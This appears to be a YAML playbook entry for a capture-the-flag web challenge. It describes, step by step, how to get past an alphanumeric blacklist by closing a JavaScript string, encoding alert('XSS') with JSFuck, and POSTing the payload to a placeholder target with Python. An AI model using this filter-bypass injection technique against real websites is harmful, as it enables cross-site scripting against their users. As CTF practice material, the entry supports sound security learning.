name: jsfuck_xss_cross32
category: web
tags: [xss, injection, jsfuck, blacklist_bypass]
indicators:
  - "Input injected into JavaScript string: var name = \"{input}\";"
  - "Blacklist filters all alphanumeric and <>"
  - "Need to trigger alert('XSS')"
  - "PhantomJS validates XSS"

tricks:
  - name: "Step 1: Identify injection point"
    when: "Analyze source code"
    how: "User input inserted into JS string variable"
    payload: |
      var name = "%s";  // Injection inside double quotes

  - name: "Step 2: Analyze blacklist"
    when: "Regular XSS fails"
    how: "Blacklist: a-z A-Z 0-9 < > (all alphanumeric and angle brackets)"
    payload: |
      # Blocked: letters, numbers, < >
      # Allowed: " ' ; : , . ! @ # $ % ^ & * ( ) _ + - = [ ] { } | \ space

  - name: "Step 3: Identify JSFuck as bypass"
    when: "Need to bypass alphanumeric filter"
    how: "JSFuck only needs [ ] ( ) ! + characters"
    payload: |
      # JSFuck encodes any JavaScript using only 6 characters
      # All 6 characters are allowed by the filter

  - name: "Step 4: Generate JSFuck payload"
    when: "Decided to use JSFuck"
    how: "Use jsfuck npm package to encode alert('XSS')"
    payload: |
      npm install jsfuck
      node -e "console.log(require('jsfuck').JSFuck.encode(\"alert('XSS')\",true))"

  - name: "Step 5: Construct final payload"
    when: "Need to close string context"
    how: "Close quotes, execute JSFuck, assign to variable to close tail"
    payload: |
      ";[JSFUCK];_="
      # Result: var name = "";[JSFUCK];_="";

  - name: "Step 6: Submit payload"
    when: "Execute attack"
    how: "POST to /page with JSFuck payload"
    payload: |
      import subprocess
      jsfuck = subprocess.run(['node', '-e', 
          "console.log(require('jsfuck').JSFuck.encode(\"alert('XSS')\",true))"],
          capture_output=True, text=True).stdout.strip()
      payload = '";' + jsfuck + ';_="'
      requests.post('http://TARGET/page', data={'name': payload})

